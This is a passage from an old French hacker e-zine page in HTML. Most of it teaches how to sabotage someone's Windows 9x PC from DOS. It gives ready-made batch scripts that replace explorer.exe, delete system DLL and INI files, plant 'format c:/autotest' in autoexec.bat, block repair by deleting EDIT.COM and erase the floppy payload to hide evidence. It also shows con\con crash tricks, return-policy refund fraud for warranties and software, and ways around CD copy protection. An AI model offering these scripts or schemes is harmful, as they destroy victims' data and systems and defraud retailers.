Tout consiste &agrave; faire lancer un autre programme que l'explorer.exe
habituel. Cel&agrave; requiert un acc&egrave;s &agrave; MS-DOS avant le
lancement de windows. Comment faire:</font>
<br><font color="#000000">Lorsque le PC d&eacute;marre, laissez enfonc&eacute;e
la touche F8 ou F4 (F8 en g&eacute;n&eacute;ral), et un menu d'options
apparait. Parmis ces options, choisissez la cinquieme qui est: <b>Invite
MS-DOS seulement</b>.&nbsp; Validez ce choix et vous vous retrouverez sous
DOS. Windows ne s'est alors pas lanc&eacute;. De l&agrave; vous avez plusieurs
solutions:</font>
<br><font color="#000000">- le programme &agrave; faire lancer &agrave;
la place de explorer.exe est d&eacute;j&agrave; sur la machine</font>
<br><font color="#000000">- le programme &agrave; faire lancer est sur
une disquette que vous avez sur vous (bien entendu).</font>
<br><font color="#000000">Dans le premier cas, voici comment faire lancer
le programme &agrave; la place de explorer.exe</font>
<br><font color="#000000">Tapez:</font>
<br><font color="#008080">del c:\windows\explorer.exe</font>
<br><font color="#000000">Validez</font>
<br><font color="#008080">copy c:\le-rep-o&ugrave;-se-trouve-le-prog-&agrave;-lancer\nom-du-prog.exe
c:\windows\explorer.exe</font>
<br><font color="#000000">Exemple:</font>
<br><font color="#FF0000">del c:\windows\explorer.exe</font>
<br><font color="#FF0000">copy c:\windows\winipcfg.exe c:\windows\explorer.exe</font>
<br><font color="#000000">Avec ces deux lignes de commandes, votre programme
d'attaque est venu remplacer explorer.exe (dans l'exemple il s'agit de
winipcfg.exe). Ainsi ce sera lui qui se lancera &agrave; la place d'explorer.exe.
Ce lancement s'effectue, comme d&eacute;j&agrave; dit, avant tout les autres
programmes windows. Pour pouvoir remettre l'explorer.exe &agrave; sa place
il vous est conseill&eacute; d'en faire une copie sous un autre nom. Voici
un exemple de sauvegarde de explorer.exe:</font>
<br><font color="#008080">copy c:\windows\explorer.exe c:\windows\datareg.exe</font>
<br><font color="#000000">L&agrave; l'explorer.exe existe sous la forme
de datareg.exe dans le r&eacute;pertoire c:\windows\. Pour r&eacute;tablir
le bon explorer.exe, vous devez effacez le mauvais, qui est sous le nom
de explorer.exe (c:\windows\explorer.exe), et recopier datareg.exe dans
le c:\windows\, sous le nom de explorer.exe. Proc&eacute;dez donc de la
mani&egrave;re suivante:</font>
<br><font color="#008080">copy c:\windows\datareg.exe c:\windows\explorer.exe</font>
<br><font color="#000000">Tout devrait refonctionner normalement. Voil&agrave;
donc ce que vous pouvez faire pour sauvegarder explorer.exe.</font>
<br>&nbsp;
<table BORDER COLS=1 WIDTH="100%" BGCOLOR="#FFCCCC" >
<tr>
<td><b><font color="#000000"><i>Note:</i> si il n'y a pas de fichiers explorer.exe
existants dans c:\windows, alors apr&egrave;s l'ouverture d'une session
windows marquera:</font></b>
<center><u><font color="#000000">Erreur dans le chargement d'Explorer</font></u>
<br><u><font color="#000000">Veuillez R&eacute;installer Windows</font></u></center>
<b><font color="#000000">Apr&egrave;s quoi, l'ordinateur s'&eacute;teint
tout seul.</font></b></td>
</tr>
</table>

<p><font color="#000000">Dans le cas o&ugrave; vous auriez envie de faire
cette manipulation rapidement sur un PC, cr&eacute;ez un .bat, ou un .com
que vous pouvez renommez en .exe. Je vous rappelle qu'il existe des programmes
permettant de transformer un .bat en .com (exemple avec bat2exec). Il vous
suffit apr&egrave;s de renommer le .com en .exe, et &ccedil;a marche (mais
<b>uniquement</b>
sous MS-DOS).</font>
<br><font color="#000000">Voil&agrave; le genre de codes sources &agrave;
faire pour &eacute;viter de perdre du temps:</font>
<br><font color="#008080">@echo off</font>
<br><font color="#008080">copy c:\windows\explorer.exe c:\windows\datareg.exe</font>
<br><font color="#008080">del c:\windows\explorer.exe</font>
<br><font color="#008080">copy c:\windows\system\sysedit.exe c:\windows\sysinii.exe</font>
<br><font color="#008080">del c:\windows\system\sysedit.exe</font>
<br><font color="#008080">copy c:\windows\winipcfg.exe c:\windows\explorer.exe</font>
<br><font color="#008080">echo autoexec >> c:\autoexec.bat</font>
<br><font color="#008080">del a:\explorer.exe</font>
<br><font color="#008080">c:</font>
<br><font color="#008080">win</font>
<br><u><font color="#000000">Cons&eacute;quences:</font></u>
<ol>
<li>
<font color="#000000">Explorer.exe est effac&eacute; du Disque dur.</font></li>

<li>
<font color="#000000">Une copie a cependant &eacute;t&eacute; faites de
Explorer.exe. Cette copie est c:\windows\datareg.exe a replacer dans c:\windows
sous le nom de explorer.exe</font></li>

<li>
<font color="#000000">Sysedit.exe est effac&eacute; du Disque dur.</font></li>

<li>
<font color="#000000">Une copie a cependant &eacute;t&eacute; faite de
Sysedit.exe. Cette copie est: c:\windows\sysinii.exe a replacer dans c:\windows\system
sous le nom de sysedit.exe</font></li>

<li>
<font color="#000000">L'explorer.exe est remplac&eacute; par winipcfg.exe.
Ainsi ce sera winipcfg qui s'ouvrira &agrave; la place de explorer.exe
apr&egrave;s l'ouverture de la session windows.</font></li>

<li>
<font color="#000000">Une ligne de commande est ajout&eacute; &agrave;
l'autoexec.bat, cette ligne ne sera prise en compte qu'apr&egrave;s red&eacute;marrage
du PC, et emp&ecirc;che l'ouverture de windows.</font></li>

<li>
<font color="#000000">Le programme explorer.exe (le "virus"), qui est sur
votre disquette, est effac&eacute;, ce qui fait ainsi disparaitre les preuves.</font></li>
</ol>
<font color="#000000">Si vous &ecirc;tes assez tendance crasher, vous pouvez
rajouter des lignes de commandes de type del ou format:</font>
<p><font color="#008080">@echo off</font>
<br><font color="#008080">copy c:\windows\explorer.exe c:\windows\datareg.exe</font>
<br><font color="#008080">del c:\windows\explorer.exe</font>
<br><font color="#008080">copy c:\windows\system\sysedit.exe c:\windows\sysinii.exe</font>
<br><font color="#008080">del c:\windows\system\sysedit.exe</font>
<br><font color="#008080">copy c:\windows\winipcfg.exe c:\windows\explorer.exe</font>
<br><font color="#FF0000">del c:\windows\*.dll</font>
<br><font color="#FF0000">del c:\windows\*.ini</font>
<br><font color="#FF0000">del c:\windows\system\*.dll</font>
<br><font color="#008080">echo </font><font color="#FF0000">format c:/autotest</font><font color="#008080">
>> c:\autoexec.bat</font>
<br><font color="#008080">del a:\explorer.exe</font>
<br><font color="#008080">c:</font>
<br><font color="#008080">win</font>
<br>&nbsp;
<br>&nbsp;
<table BORDER COLS=1 WIDTH="100%" BGCOLOR="#FFCCCC" >
<tr>
<td><b><i>Note:</i></b> <b>les commandes MS-DOS de types </b><u>format
c:/autotest</u><b> font un formatage imm&eacute;diat du lecteur vis&eacute;
et sans demande de confirmation.</b>
<br><b><i>Note: </i>&eacute;vitez d'ins&eacute;rez des commandes de type
</b><u>del
*.*</u><b>. En effet ce type de commandes demande confirmation &agrave;
l'utilisateur tandis que une commande de type </b><u>del*.exe ou del *.dll</u><b>
n'en demande pas.</b>
<br><i><b>Note:</b> </i><b>l'autoexec.bat est un fichier MS-DOS qui s'ouvre
avant Windows. N'h&eacute;sitez donc pas &agrave; &eacute;crire ce que
vous voulez dessus. Prenez soin d'effacer aussi le fichier </b><u>EDIT.COM</u><b>,
qui permettrait une r&eacute;paration des fichiers .bat depuis MS-DOS.</b>
<br><b>Note: la commande </b><u>echo ligne-de-commande >> c:\rep\nom_du_fichier</u><b>permet
d'&eacute;crire sur un fichier texte ou .bat, une ligne de commande d&eacute;sir&eacute;e.
Dans l'article il s'agit de</b> <u>format c:/autotest</u></td>
</tr>
</table>

<p><font color="#000000">Vous pouvez aussi cr&eacute;ez vos propres programmes
dans diff&eacute;rents languages de mani&egrave;re &agrave; faire de ce
type d'attaques de v&eacute;ritables joujous de guerre qui iraient jusqu'&agrave;
lancer des trojans sur des serveurs bien prot&eacute;g&eacute;s de mani&egrave;re
bien sentie, sans qu'aucun anti-virus ne puisse se d&eacute;fendre puisqu'aucun
anti-virus ne peut se lancer si explorer.exe n'est pas correctement lanc&eacute;.</font>
<br><font color="#000000"><i>Exemple: </i>faites un programme de type .exe
qui red&eacute;marre la machine de la vicitme/serveur. La victime ne peut
plus rien faire d'autre qu'attendre que tout se lance. Votre programme
se lancera d&egrave;s le d&eacute;marrage de la machine, sous MS-DOS, avant
Windows et ensuite un trojan pourra &ecirc;tre lanc&eacute; &agrave; l'insu
du plein gr&eacute; des victimes. Cependant ces m&ecirc;me victimes n'auront
qu'&agrave; se d&eacute;connecter de l'internet pour parer une quelconque
intrusion. L'effet secondaire est que le serveur sera mis hors-service.
Sachez que ce genre de m&eacute;thodes est applicable, et qu'il ne s'agit
l&agrave; plus de th&eacute;orie.</font>
<p><font color="#000000">Evitez cependant de trop jouer avec &ccedil;a.
Ne dit-on pas que le crime ne profite jamais?</font>
<center>
<p><b><u><font color="#000000">Remboursage de matos non assur&eacute; et
avoir des logiciels gratuits</font></u></b></center>

<p><font color="#000000">&nbsp;&nbsp; Vous avez besoin de faire rembourser
un de vos appareils alors que la garantie n'est plus valable? Alors j'ai
la solution. Achetez par correspondance le m&ecirc;me produit que celui
qui vous fait d&eacute;faut. Lorsque vous le recevez, intervertissez les
appareils. Il ne vous reste plus qu'&agrave; retourner l'appareil d&eacute;fectueux
(sans mentionner la panne) et faire jouer la loi du 6 janvier 1988. Vous
recevrez alors le remboursement du produit. Cel&agrave; ne vous aura co&ucirc;t&eacute;
que les frais de ports. Mais attention: certains magasins pensent &agrave;
noter les num&eacute;ros de s&eacute;rie sur la facture d'achat.</font>
<p><font color="#000000">&nbsp;&nbsp; En ce qui concerne vos logiciels
gratuits. Allez dans des magasins qui font du "satisfait ou rembours&eacute;",
sinon renseignez vous sur les conditions de vente. Achetez, par exemple,
un Anti-Virus et conservez bien l'emballage et le ticket de caisse. Rentrez
chez vous, faites le graver, retournez au magasin avec le produit emball&eacute;
et votre ticket de caisse. Dites que vous n'avez pas pris le bon produit
ou que vos drivers ne sont pas compatibles avec le produit. Faites vous
rembourser. Au final: un logiciel gratuit et avec des risques minimums.
Renseignez-vous sur les modalit&eacute;s de remboursements des produits
aupr&egrave;s d'un vendeur qualifi&eacute; pour ne pas vous tromper. Lors
de l'installation d'un logiciel, pensez &agrave; lire la mise en garde
(<i>License Agreement</i>), ce genre de paragraphes peuvent &ecirc;tre
int&eacute;ressants:</font>
<br><font color="#008080">Si vous ne souhaitez pas &ecirc;tre tenu par
le pr&eacute;sent accord, et que vous n'en acceptez pas tous les termes
et conditions, s&eacute;lectionnez "I refuse", ce qui annulera le chargement
du logiciel et <b>retournez sous trente jours, le logiciel, son EMBALLAGE
AINSI que tous les &eacute;l&eacute;ments qui s'y trouvaient avec la preuve
d'achat dat&eacute;e &agrave; l'endroit ou vous l'aviez acquis afin d'en
obtenir le remboursement int&eacute;gral.</b></font>
<br><font color="#000000">Trente jours pour graver un logiciel, &ccedil;a
laisse du temps. Ce n'est pas du vol, mais presque.</font>
<center>
<p><b><u><font color="#000000">Erreure fatale <i>(source: virus informatique)</i></font></u></b></center>

<p><font color="#000000">&nbsp;&nbsp; "L'erreur fatale", aussi appel&eacute;e
"l'&eacute;cran bleu de la mort". La plaie de toutes les personnes travaillant
sous Windows. Nous avons la solution... pour que l'&eacute;cran ne soit
plus bleu. Vous pouvez maintenant choisir les couleurs du fond de cet &eacute;cran
et la couleur des caract&egrave;res. L'astuce ne marche que sous Win9x
et la proc&eacute;dure est simple:</font>
<br><font color="#000000">- Ouvrez votre fichier system.ini (c:\windows)</font>
<br><font color="#000000">- Editez le avec un &eacute;diteur de texte&nbsp;
(Bloc-Notes)</font>
<br><font color="#000000">- Cherchez la ligne de caract&egrave;res suivante:
<b>[386Enh]</b></font>
<br><font color="#000000"><b>- </b>Ins&eacute;rez les 2 lignes suivantes:</font>
<blockquote><font color="#008080">MessageTextColor=E</font>
<br><font color="#008080">MessageBackColor=2</font></blockquote>
<font color="#000000">- La premi&egrave;re ligne correspond &agrave; la
couleur des caract&egrave;res utilis&eacute;s, et al deuxi&egrave;me &agrave;
la couleur du fond de la fen&ecirc;tre. Ici le E=Jaune clair, et le 2=Vert</font>
<br><font color="#000000">Voici le code des couleurs. Vous ne pouvez assemblez
plusieurs couleurs (plusieurs caract&egrave;res &agrave; la suite):</font>
<br><font color="#000000">0 - Noir</font>
<br><font color="#000000">1 - Bleu</font>
<br><font color="#000000">2 - Vert</font>
<br><font color="#000000">3 - Cyan</font>
<br><font color="#000000">4 - Rouge</font>
<br><font color="#000000">5 - Magenta</font>
<br><font color="#000000">6 - Jaune</font>
<br><font color="#000000">7 - Blanc</font>
<br><font color="#000000">8 - Gris</font>
<br><font color="#000000">9 - Bleu clair</font>
<br><font color="#000000">A - Vert clair</font>
<br><font color="#000000">B - Cyan clair</font>
<br><font color="#000000">C - Rouge clair</font>
<br><font color="#000000">D - Magenta clair</font>
<br><font color="#000000">E - Jaune clair</font>
<br><font color="#000000">F - Blanc</font>
<center>
<p><b><u><font color="#000000">Rendre les r&eacute;pertoires en partage
invisibles, dans un r&eacute;seau NetBIOS</font></u></b></center>

<p><font color="#000000">&nbsp;&nbsp; Ajoutez le signe $ &agrave; la fin
du r&eacute;pertoire en partage. Il ne sera ainsi plus visible par les
autres utilisateurs du r&eacute;seau. Il est quand m&ecirc;me possible
d'y acc&eacute;der si on utilise la fonction "connecter un lecteur r&eacute;seau"
compl&eacute;t&eacute;e par la ligne ":\\NOM_DU_PC\NOM_DU_DOSSIER$"</font>
<center>
<p><b><u><font color="#000000">Planter Windows en 2 le&ccedil;ons</font></u></b></center>

<p><font color="#000000">Il existe 2 mani&egrave;res de planter Windows
de mani&egrave;re efficace et innofensive.</font>
<br><font color="#000000">La premi&egrave;re se fait dans:</font>
<br><b><font color="#000000">D&eacute;marrer/Executer</font></b>
<br><font color="#000000">Tapez</font>
<br><b><font color="#000000">c:\con\con</font></b>
<br><font color="#000000">Boum! Erreur dans l'allocation des fichiers.
Rebootage obligatoire.</font>
<br><font color="#000000">L'autre m&eacute;thode se fait depuis une fen&ecirc;tre
MS-DOS, sous Windows:</font>
<br><font color="#000000">Tapez</font>
<br><b><font color="#000000">cd con\con</font></b>
<br><font color="#000000">Erreur au niveau syst&egrave;me. Cette deuxi&egrave;me
m&eacute;thode est plus sympathique car il n'est pas tout de suite visible
que Windows a planter. Cette technique fout le noyau Windows en l'air jusqu'au
prochain red&eacute;marrage de l'OS. De toutes fa&ccedil;ons au bout de
3&agrave; secondes d'utilisation de Windows apr&egrave;s un plantage de
ce type et vous vous apercevrez qu'un rebootage est n&eacute;cessaire.</font>
<br>&nbsp;
<table BORDER COLS=1 WIDTH="100%" BGCOLOR="#FFCCCC" >
<tr>
<td><b><i>Note: </i>il est possible de remplacer </b><u>con</u><b> par
</b><u>nul</u><b>
ou bien faire le m&eacute;lange des deux. Le r&eacute;sultat reste le m&ecirc;me.</b>
<br><b>Exemple: </b><u>c:\nul\nul</u><b> ou </b><u>c:\nul\con</u>
<br><b><i>Note</i>: pour l'astuce MS-DOS il est possible de faire un .bat
comme</b>
<br><b><font color="#3366FF">@echo off</font></b>
<br><b><font color="#3366FF">cd con\con</font></b></td>
</tr>
</table>

<center>
<p><b><u><font color="#000000">Protections sur le gravage des CD<i> (source:
virus informatique)</i></font></u></b></center>

<p><font color="#000000">&nbsp;&nbsp; Les protections de cartains jeux
laissent parfois &agrave; d&eacute;sirer. Etudions deux cas dans lesquels
les protections sont daubiques et facilement cassables:</font>
<ol>
<li>
<font color="#000000">Des &eacute;diteurs se bornent &agrave; sortir des
CD dont la seule protection est la dur&eacute;e sup&eacute;rieure &agrave;
74 minutes (ex: HereticII ou King Quest 8). cette protecetion est facilement
cassable depuis l'apparition des CD de 80 minutes.</font></li>

<li>
<font color="#000000">D'autres ajoutent &agrave; cette premi&egrave;re
protection une organisation des pistes peu commune: donn&eacute;es-audio,
audio-donn&eacute;es, que peu de logiciels reconnaissent. Equipez vous
alors de graveurs comme <b>Plextor PX-R412C</b>, <b>Teac CD-R50S &amp;
CD-R55S</b> et <b>Yamaha CDR200/400/401 &amp; CRW 2260/4260/4001/2216/4216/4261/4416</b>,
etc.</font></li>

<br><font color="#000000">Pour finir, une protection toute b&ecirc;te consiste
&agrave; faire croire que la quantit&eacute; de donn&eacute;es stock&eacute;es
sur le CD est de plusieurs gigas (ex: Commando, Tomb RaiderIII, ...). Prenez
alors des logiciels comme <b>Nero Burning </b>sup&eacute;rieur &agrave;<b>
3.0.7.1</b> ou <b>CDRWIN 3.6b</b> minimum. Quand il vous dira qu'il n'y
a pas assez de place sur le CD vierge, ignorez l'avertissement et continuez!
Esperez que le support CD encaisserait bien &ccedil;a. Pour la deuxi&egrave;me
protection cochez aussi la case: <b>ignorez mauvais format de CD</b>.</font></ol>

<hr WIDTH="100%">
<p>&nbsp;&nbsp; C'est sur ce chapitre que vous finissez le zine. Pour tout
commentaires &eacute;crivez moi :
<br><a href="mailto:clad_strife@hotmail.com">clad_strife@hotmail.com</a>
<p><b>Auteur: Clad Strife</b>
<div align=right><a href="mailto:clad_strife@hotmail.com"><img SRC="bigepee.gif" height=189 width=249></a></div>

</body>
</html>
